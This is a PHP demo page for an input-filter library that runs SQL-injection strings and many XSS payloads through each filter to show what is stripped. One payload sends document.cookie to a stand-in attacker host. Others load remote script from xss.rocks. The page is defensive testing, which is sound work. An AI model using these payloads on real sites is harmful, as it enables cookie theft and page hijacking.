<?php
    // Initialize the test application
    require_once("../../../testApp/init.php");
    // Add the header to the interface
    include_once(UI_DIR . "header.php");
    use Kobalt\SimpleBase\DataFilter;
    use Kobalt\SimpleBase\PhoneFilter;
    use Kobalt\SimpleBase\EmailFilter;
    use Kobalt\SimpleBase\URLFilter;
    use Kobalt\SimpleBase\FNFilter;
    use Kobalt\SimpleBase\TextFilter;
    use Kobalt\SimpleBase\HTMLFilter;
    use Kobalt\SimpleBase\IntFilter;
    use Kobalt\SimpleBase\FloatFilter;
    use Kobalt\SimpleBase\BoolFilter;
    use Kobalt\SimpleBase\FileFilter;
    use Kobalt\SimpleBase\ImgFilter;
    use Kobalt\SimpleBase\Message;
?>
    <h1>Kobaltkween's SimpleBase Library: Filters</h1>
    <p>This is a demonstration of all of the input filters.</p>
    
    <h2>DataFilter</h3>
    <p>This uses an array of acceptable values (a whitelist) to filter acceptable values.  It uses htmlentities for a display function.  This is the parent class of all the other "Filter" classes.</p>
    <?php
    $vals = [];
    $vals[] = "DESC";
    $vals[] = "DES";
    $vals[] = "DESC; DROP TABLE Image;";
    $vals[] = "name=<script>window.onload = function() {var link=document.getElementsByTagName(\"a\");link[0].href=\"http://not-real-xssattackexamples.com/\";}</script>";
    $dp = new DataFilter();
    $dp->setWhitelist(["ASC", "DESC"]);
    ?>
    <ul>
        <?php foreach ($vals as $val) {
        $res = "";
        try {
            $res = $dp->display($dp->filter($val));
        } catch (Exception $e) {
            $res = $e->getMessage();
        } ?>
        <li><?php echo "Original: " . htmlentities($val) . "<br> Result: " . $res ?></li>
    <?php } ?>
    </ul>
    <h2>PhoneFilter</h3>
    <?php
    $phoneNums = [];
    $phoneNums[] = "(123) 456-7890";
    $phoneNums[] = "123-456-7890";
    $phoneNums[] = "123 456 7890";
    $phoneNums[] = "1-123-456-7890";
    $phoneNums[] = "123-456-7890 x 1234";
    $phoneNums[] = "(234) 789-8524 AND 1 = 1;";
    $phoneNums[] = "123-456-7890\" onmouseover=\"alert('XSS Baby!')\"";
    $pp = new PhoneFilter();
    ?>
    <ul>
    <?php foreach ($phoneNums as $num) {
        $res = "";
        try {
            $res = $pp->display($pp->filter($num));
        } catch (Exception $e) {
            $res = $e->getMessage();
        } ?>
        <li><?php echo "Original: " . htmlentities($num) . "<br> Result: " . $res ?></li>
    <?php } ?>
    </ul>
    <h2>EmailFilter</h3>
    <?php
    $emails = [];
    $emails[] = "foo@service.com";
    $emails[] = "foo@service";
    $emails[] = "foo@service.com AND 1 = 1;";
    $emails[] = "email=<script>window.onload = function() {var link=document.getElementsByTagName(\"a\");link[0].href=\"http://not-real-xssattackexamples.com/\";}</script>";
    $ep = new EmailFilter();
    ?>
    <ul>
    <?php foreach ($emails as $email) {
        $res = "";
        try {
            $res = $ep->display($ep->filter($email));
        } catch (Exception $e) {
            $res = $e->getMessage();
        } ?>
        <li><?php echo "Original: " . htmlentities($email) . "<br> Result: " . $res ?></li>
    <?php } ?>
    </ul>
    <h2>TextFilter</h3>
    <?php
    $text = "Text like this!  Need to include lots of special characters, like +, -, %, $, } (; @.  Here's a reference to an email: foo@ service.com.  How's that? 5 > 4 < 8 but h8 < < 3.";
    $textMistake = "This accidentally or erroneously has a tag in it.  You should go to the site <a href=\"http://www.foo.com\">Foobar!</a>";
    $textSI = "Texty texty text.; DROP TABLE Image;";
    $textXSS = "<<script>script> alert(\"Haha, I hacked your page.\"); </</script>script>  <a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">My Name</a>";
    $textXSS2 = "< script > alert(\"Haha, I hacked your page.\"); < /script >";
    $tp = new TextFilter();
    ?>
    <table>
        <thead>
            <tr>
                <th>Original</th>
                <th>Filtered</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><?php echo $text; ?></td>
                <td><?php echo $tp->display($tp->filter($text)); ?></td>
            </tr>
            <tr>
                <td><?php echo $textMistake; ?></td>
                <td><?php echo $tp->display($tp->filter($textMistake)); ?></td>
            </tr>
            <tr>
                <td><?php echo $tp->display($textXSS); ?></td>
                <td><?php echo $tp->display($tp->filter($textXSS)); ?></td>
            </tr>
            <tr>
                <td><?php echo $tp->display($textXSS2); ?></td>
                <td><?php echo $tp->display($tp->filter($textXSS2)); ?></td>
            </tr>
        </tbody>
    </table>
    <h2>URLFilter</h3>
    <p>A filter for offsite URLs.  These can't really be filtered for malicious JS, since the JS could always be on the page.  If you want to protect people from them, try an interstitial page before leaving your site.  Most sites don't do this, though.</p>
    <?php
    $urls = [];
    $urls[] = "http://www.foobar.com/";
    $urls[] = "http:/www.foobar.com";
    $urls[] = "http:/www . foobar.com";
    $urls[] = "http://www.foobar.com OR 1 = 1;"; // SI
    $urls[] = "\";alert('XSS');//";  //XSS
    $up = new URLFilter();
    ?>
    <ul>
    <?php foreach ($urls as $url) {
        $res = "";
        try {
            $res = $up->display($up->filter($url));
        } catch (Exception $e) {
            $res = $e->getMessage();
        } ?>
        <li><?php echo "Original: " . htmlentities($url) . "<br> Result: " . $res ?></li>
    <?php } ?>
    </ul>
    <h2>FNFilter</h3>
    <p>This filter is for the filenames of files uploaded to the server.  It allows letters, numbers, !, ?, -, _, /, &amp;, and $.  It uses </p>
    <?php
    $filename = "foo-bar.jpg";
    $filename2 = "/images/uploads/foobar_all&sundryChicago?!.v1.jpg";
    $filenameMistake = "/images/uploads/foo-bar $$bar..jpg";
    $filenameMistake2 = "ImageWith__this--@Chic&&ago*s#woon+a.goof.jpg";
    $filenameSI = "filename OR 1 = 1;";
    $filenameXSS0 = "javascript:alert('XSS');";
    $filenameXSS1 = "jav&#x0D;ascript:alert('XSS');";
    $filenameXSS2 = "`javascript:alert(\"RSnake says, 'XSS'\")`";
    $filenameXSS3 = "javascript:alert(String.fromCharCode(88,83,83))";
    $filenameXSS4 = "\";alert('XSS');//";
    $fp = new FNFilter();
    ?>
    <table>
        <thead>
            <tr>
                <th>Original</th>
                <th>Filtered</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><?php line($filename); ?></td>
                <td><?php line($fp->filter($filename, "jpg")); ?></td>
            </tr>
            <tr>
                <td><?php line($filename2); ?></td>
                <td><?php line($fp->filter($filename2, "jpg")); ?></td>
            </tr>
            <tr>
                <td><?php line($filenameMistake); ?></td>
                <td><?php line($fp->filter($filenameMistake, "jpg")); ?></td>
            </tr>
            <tr>
                <td><?php line($filenameMistake2); ?></td>
                <td><?php line($fp->filter($filenameMistake2, "jpg")); ?></td>
            </tr>
            <tr>
                <td><?php line($filenameSI); ?></td>
                <td><?php line($fp->filter($filenameSI, "jpg")); ?></td>
            </tr>
            <tr>
                <td><?php line($filenameXSS0); ?></td>
                <td><?php line($fp->filter($filenameXSS0, "jpg")); ?></td>
            </tr>
            <tr>
                <td><?php line($filenameXSS1); ?></td>
                <td><?php line($fp->filter($filenameXSS1, "jpg")); ?></td>
            </tr>
            <tr>
                <td><?php line($filenameXSS2); ?></td>
                <td><?php line($fp->filter($filenameXSS2, "jpg")); ?></td>
            </tr>
            <tr>
                <td><?php line($filenameXSS3); ?></td>
                <td><?php line($fp->filter($filenameXSS3, "jpg")); ?></td>
            </tr>
            <tr>
                <td><?php line($filenameXSS4); ?></td>
                <td><?php line($fp->filter($filenameXSS4, "jpg")); ?></td>
            </tr>
        </tbody>
    </table>
    <h2>HTMLFilter</h3>
    <p>This makes use of the <a href="http://htmlpurifier.org">HTMLPurifier library</a>.  It's set to allow strong, em, paragraph, blockquote, ordered list, and unordered list tags.  It's also set to allow anchor tags with href attributes.</p>
    <?php
    $html = "<p>Lorem ipsum <strong>dolor sit amet</strong>, consectetur adipiscing elit. &nbsp;&nbsp;&nbsp;In <em>arcu arcu</em>, imperdiet ut ipsum nec, tincidunt posuere lorem. Nulla ultricies eu ante sit amet convallis. &ldquo;Vivamus sagittis &lsquo;diam a tellus&rsquo; luctus, vitae cursus turpis convallis.&rdquo; Morbi eget consectetur eros, in ultricies sem. Proin gravida purus vitae ex iaculis, sed fermentum risus dictum. Proin vel lacus ut sem maximus dignissim. Duis at <a href=\"http://www.google.com/\">justo sit amet</a>- ante elementum dictum at sit amet erat.</p>

    <blockquote>Vivamus &amp; non nisi in lectus tincidunt convallis nec a tortor. Donec et dui vitae ligula mattis ornare quis at purus. Donec lacinia turpis eget scelerisque tincidunt. Sed aliquam ex a mauris mattis dignissim. Vivamus a enim eu ligula fringilla convallis id vitae est. Nam posuere ligula lorem, a blandit urna iaculis aliquam. Morbi tincidunt orci nec odio tristique, fermentum venenatis nibh dapibus.</blockquote>

    <ol>
        <li>Fish</li>
        <li>Seals</li>
        <li>Sharks</li>
        <li>Killer whiles</li>
    </ol>

    <ul>
        <li>Peas</li>
        <li>Porridge</li>
        <li>Pot<br> Nine days old</li>
    </ul>";
    $htmlMistake = "<p>Lorem ipsum <strong>dolor sit amet</strong>, consectetur adipiscing elit. In <em>arcu arcu</em>, imperdiet ut ipsum nec, tincidunt posuere lorem. Nulla ultricies eu ante sit amet convallis. \"Vivamus sagittis 'diam a tellus' luctus, vitae cursus turpis convallis.\" Morbi eget consectetur eros, in ultricies sem. <ul>Proin gravida purus</ul> vitae ex iaculis, sed fermentum risus dictum. Proin vel lacus ut sem maximus dignissim. Duis at <a href=\"http://www.google.com/\">justo sit amet</a>- ante elementum dictum at sit amet erat.<span></span>

    <p></p>

    <blockquote>Vivamus & non nisi in lectus tincidunt convallis nec a tortor. Donec et dui vitae ligula mattis ornare quis at purus. Donec lacinia turpis eget scelerisque tincidunt. Sed aliquam ex a mauris mattis dignissim. Vivamus a enim eu ligula fringilla convallis id vitae est. Nam posuere ligula lorem, a blandit urna iaculis aliquam. Morbi tincidunt orci nec odio tristique, fermentum venenatis nibh dapibus.</blockquote>

    <ol>
        <li>Fish</li>
        <li>Seals
        <li>Sharks</li>
        <li>Killer whiles
    </ol>

    <ul>
        <li>Peas</li>
        <li>Porridge</li>
        <li>Pot<br> Nine days old</li>
    </ul>";
    $htmlXSS0 = "Basic XSS: <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>;";
    $htmlXSS1 = "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";
alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>";
    $htmlXSS2 = "'';!--\"<XSS>=&{()}";
    $htmlXSS3 = "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"></script>
<script>alert(document.cookie)</script>\">
<img/id=\"confirm&lpar;1)\"/alt="/"src="/"onerror=eval(id)>'\">
<img src=\"http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg\">";
    $htmlXSS4 = "<IMG SRC=javascript:alert('XSS')> The image tag preceeding this should be stripped.";
    $htmlXSS5 = "The first XSS test: <IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"><br>
                                <a href=\"javascript:alert(\"XSS\")\";>First Dangerous link</a>
                                <a href=\"http://www.google.com/\" onmouseover=\"alert('xxs')\">Second dangerous link</a>\<br>
                                <a href=\"http://www.google.com/\"  onerror=\"alert(String.fromCharCode(88,83,83))\">Third dangerous link</a><br>
                                Hidden script tag: <<SCRIPT>alert(\"XSS\");//<</SCRIPT><br>
                                Non-alpha-non-digit: <SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT><br>
                                No closing tags: <SCRIPT SRC=http://xss.rocks/xss.js?< B ><br>
                                <a href='vbscript:msgbox(\"XSS\")'>VBScript link</a><br>
                                SVG: <svg/onload=alert('XSS')
                                Meta with URL parameter: <META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">>
                                Table and td:
                                <TABLE BACKGROUND=\"javascript:alert('XSS')\">
                                <TD BACKGROUND=\"javascript:alert('XSS')\">Inside the cell</TD>
                                </TABLE>
                                <p STYLE=\"background-image: url(javascript:alert('XSS'))\">Dangerous styles</p>";
    $htmlPHP = "<? echo('<SCR)'; echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>";

    $hp = new HTMLFilter();
    ?>
    <table>
        <thead>
            <tr>
                <th>Original</th>
                <th>Filtered</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><?php echo $html; ?></td>
                <td><?php echo $hp->filter($html); ?></td>
            </tr>
            <tr>
                <td><?php line($htmlMistake); ?></td>
                <td><?php line($hp->filter($htmlMistake)); ?></td>
            </tr>
            <tr>
                <td><?php line($htmlXSS0); ?></td>
                <td><?php line($hp->filter($htmlXSS0)); ?></td>
            </tr>
            <tr>
                <td><?php line($htmlXSS1); ?></td>
                <td><?php line($hp->filter($htmlXSS1)); ?></td>
            </tr>
            <tr>
                <td><?php line($htmlXSS2); ?></td>
                <td><?php line($hp->filter($htmlXSS2)); ?></td>
            </tr>
            <tr>
                <td><?php line($htmlXSS3); ?></td>
                <td><?php line($hp->filter($htmlXSS3)); ?></td>
            </tr>
            <tr>
                <td><?php line($htmlXSS4); ?></td>
                <td><?php line($hp->filter($htmlXSS4)); ?></td>
            </tr>
            <tr>
                <td><?php line($htmlXSS5); ?></td>
                <td><?php line($hp->filter($htmlXSS5)); ?></td>
            </tr>
            <tr>
                <td><?php line($htmlPHP); ?></td>
                <td><?php line($hp->filter($htmlPHP)); ?></td>
            </tr>
        </tbody>
    </table>
    <h2>IntFilter</h3>
    <p>Filters and displays <a href="http://php.net/manual/en/language.types.integer.php">integers</a>.  It uses the filter_var function.</p>
    <?php
        $ints = [];
        $ints[] = 1;
        $ints[] = -100;
        $ints[] = 0123; // octal number (equivalent to 83 decimal)
        $ints[] = 0x1A; // hexadecimal number (equivalent to 26 decimal)
        $ints[] = 0b11111111; // binary number (equivalent to 255 decimal)
        $ints[] = "20,210,1000";
        $ints[] = "1 = 1"; // The cleaner will strip out the spaces and the '='
        $ints[] = "onmouseover=alert('Wufff!')";
        $ints[] = ""; // See what happens with an empty string
        $ip = new IntFilter();
    ?>
    <ul>
    <?php foreach($ints as $i) {
            $res = "";
            try {
                $num = $ip->filter($i);
                $res = $ip->display($num);
            } catch (Exception $e) {
                $m = new Message();
                $m->except("Value not accepted.", $e);
                $res = $m->out();
            }
            ?>
        <li>Original: "<?php echo (string)$i; ?>" ||  Filtered: <?php echo $res; ?></li>
    <? } ?>
    </ul>
    <h2>FloatFilter</h3>
    <p>Filters and displays <a href="http://php.net/manual/en/language.types.float.php">floating point numbers</a>.  It uses the filter_var function, and requires a precision number for the filter.</p>
    <?php
        $floats = [];
        $floats[] = 1.234;
        $floats[] = -10.978;
        $floats[] = 10;
        $floats[] = -1.2e3;
        $floats[] = 7E10;
        $floats[] = (0.7 + 0.1) * 10.0;
        $floats[] = "1 = 1"; // The cleaner will strip out the spaces and the '='
        $floats[] = "onmouseover=alert('Wufff!')";
        $fltp = new FloatFilter();
    ?>
    <ul>
    <?php foreach($floats as $f) {
            $res = "";
            try {
                $num = $fltp->filter($f, 6);
                //$res = $num;
                $res = $fltp->display($num);
            } catch (Exception $e) {
                $res = $e->getMessage();
            }
            ?>
        <li><?php echo $res; ?></li>
    <? } ?>
    </ul>
    <h2>BoolFilter</h3>
    <p>Filters and displays <a href="http://php.net/manual/en/language.types.float.php">booleans</a>.  It allows for true and false (case insensitive) and 0 and 1.  It returns 0 and 1, so that databases like MySQL that don't specifically use boolean types can store the values.</p>
    <?php
        $bools = [];
        $bools[] = 1;
        $bools[] = "true";
        $bools[] = "True";
        $bools[] = "TRUE";
        $bools[] = 0;
        $bools[] = "false";
        $bools[] = "False";
        $bools[] = "FALSE";
        $bools[] = true;
        $bools[] = false;
        $bools[] = "1 = 1"; // The cleaner will strip out the spaces and the '='
        $bools[] = "onmouseover=alert('Wufff!')";
        $bools[] = "<script>var foo = 10; </script>";
        $bp = new BoolFilter();
    ?>
    <ul>
    <?php foreach($bools as $b) {
            $res = "";
            try {
                $num = $bp->filter($b);
                //$res = $num;
                $res = $bp->display($num);
            } catch (Exception $e) {
                $res = $e->getMessage();
            }
            ?>
        <li><?php echo "Original: " . htmlentities($b) . "<br>Result: " . $res; ?></li>
    <? } ?>
    </ul>
    <h2>FileFilter</h3>
    <p>This filters files that are uploaded by filesize and file mimetype.</p>
    <?php
        copy("./files/test.blend", "./files/mal.jpg");
        $files = [];
        $files[] = "./files/testPNG.png";
        $files[] = "./files/testJPG.jpg";
        $files[] = "./files/test.mp3";
        $files[] = "./files/test.pdf";
        $files[] = "./files/test.txt";
        $files[] = "./files/mal.jpg";
        $files[] = "./files/test2.jpg";
        $filePrep = new FileFilter(0.750, ["image/jpg", "image/png", "text/plain", "application/pdf"]);
        $uploadDir = "./upload/";
        function testUpload($file, $dir, $fp, $fnp) {
            $fm = new Message();
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
            try {
                $fp->filter($file);
                $path = pathinfo($file);
                $base = $path["basename"];
                $newFile = $fnp->filter($dir . $base, $fp->ext);
                if (!copy($file, $newFile)) {
                    throw Exception("Could not copy file to new location.");
                } else {
                    $nf = $fp->display($newFile);
                    echo "<a href=\"" . $nf . "\">$nf</a>";
                }
            } catch (Exception $e) {
                $fm->except("Test upload not allowed.", $e);
                echo $fm->out();
            }
        }
    ?>

    <ul>
        <?php foreach($files as $file) { ?>
            <li><?php testUpload($file, $uploadDir, $filePrep, $fp); ?></li>
        <?php } ?>
    </ul>
    <h2>ImageFilter</h3>
    <p>This is a child of the FileFilter class, which uses a default mime list for PNG, JPG, GIF.</p>
    <?php
    $ip = new ImgFilter(0.75, 2400, 1600);
    // Only setting the thumbnail height, not the width
    $ip->setThumbProps(0, 350);
    function testImageUp($file, $dir, $ip, $fnp) {
            $fm = new Message();
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
            try {
                $imgData = $ip->imageFilter($file, true);
                $path = pathinfo($file);
                $date = new DateTime();
                $base = $path["filename"] . $date->getTimestamp() . $path["extension"];
                $thumbBase = $path["filename"] . $date->getTimestamp() . "Thumb";
                $newFile = $fnp->filter($dir . $base, $ip->ext);
                $newThumb = $fnp->filter($dir . $thumbBase, "jpg");
                if (!copy($file, $newFile)) {
                    throw Exception("Could not copy file to new location.");
                } else {
                    $newImg = $ip->display($newFile);
                    $ip->writeThumb($newThumb);
                    echo "<a href=\"" . $newImg . "\"><img src=\"$newThumb\" width=\"$ip->tw\" height=\"$ip->th\"></a>";
                }
            } catch (Exception $e) {
                $fm->except("Test upload not allowed.", $e);
                echo $fm->out();
            }
        }
    ?>

    <ul>
        <?php foreach($files as $file) { ?>
            <li><?php testImageUp($file, $uploadDir, $ip, $fp); ?></li>
        <?php } ?>
    </ul>
<?php
include_once(UI_DIR . "footer.php");
?>
